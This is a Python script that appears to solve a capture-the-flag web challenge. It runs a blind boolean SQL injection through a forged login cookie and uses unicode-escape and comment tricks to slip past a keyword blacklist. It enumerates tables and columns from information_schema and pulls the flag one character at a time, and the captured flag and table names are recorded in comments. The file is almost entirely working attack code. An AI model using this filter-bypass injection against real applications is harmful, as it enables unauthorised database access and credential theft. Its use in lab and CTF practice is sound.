import requests
import json
#url = "http://localhost:7000/index.php"
url = "http://web39.buuoj.cn/include/common.php"


def bypass(s):
	s = s.replace("or","\\u006f\\u0072")
	s = s.replace(" ","/**/")
	s = s.replace("=","\\u003d")
	s = s.replace("un","\\u0075\\u006e")
	s = s.replace("mi","\\u006d\\u0069")
	return s

#$blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|\#|\s/i';
db = ''
for j in range(1,100):
	for i in range(33,127):
		headers = {
    		#'cookie': 'islogin=1;login_data={"admin_user":"%s","admin_pass":true}' %bypass("admin' and ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d and '1"%(j,i)),
			#'cookie': 'islogin=1;login_data={"admin_user":"%s","admin_pass":true}' %bypass("admin' and ord(mid((select group_concat(column_name) from information_schema.columns where table_name='fl2222g'),%d,1))=%d and '1"%(j,i)),
			'cookie': 'islogin=1;login_data={"admin_user":"%s","admin_pass":true}' %bypass("admin' and ord(mid((select f44ag from fl2222g),%d,1))=%d and '1"%(j,i)),
		}
		#print(headers)
		r = requests.get(url,headers=headers)
#print(r.text)
		#print(r.headers['Set-Cookie'])
		if r.status_code == 429:
			while True:
				r = requests.get(url,headers=headers)
				if r.status_code == 200:
					break			
			if 'deleted' not in r.headers['Set-Cookie']:
				db += chr(i)
				print(db)
				break
		else:
			if 'deleted' not in r.headers['Set-Cookie']:
				db += chr(i)
				print(db)
				break


#database() hctf_kouzone
#table_name fish_admin,fish_ip,fish_user,fl2222g
# flag{wfltx785r4vqdatmq1oh3j3rp0b18z4m}